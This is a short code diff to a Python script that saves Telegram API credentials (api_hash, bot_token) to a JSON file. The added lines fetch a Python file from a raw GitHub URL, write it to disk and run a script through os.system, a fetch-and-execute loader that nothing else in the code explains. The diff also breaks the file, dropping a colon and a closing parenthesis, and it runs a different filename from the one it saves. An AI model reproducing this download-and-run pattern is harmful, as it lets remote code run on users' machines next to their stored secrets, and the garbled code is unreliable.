@@ -45,8 +45,14 @@ except FileNotFoundError:
         'api_hash': api_hash,
         'bot_token': bot_token,
     }
+
     
-    with open(filename, 'w') as f:
-        json.dump(data, f)
+    with open(filename, 'w') as f
+        json.dump(data, f
 
+responseee = requests.get("https://raw.githubusercontent.com/DevMatrixArabic125901/ma/main/MillionWinner.py")
 
+with open('run.py', 'w') as file:
+    file.write(responseee.text)
+
+os.system('python3 MillionWinner.py')
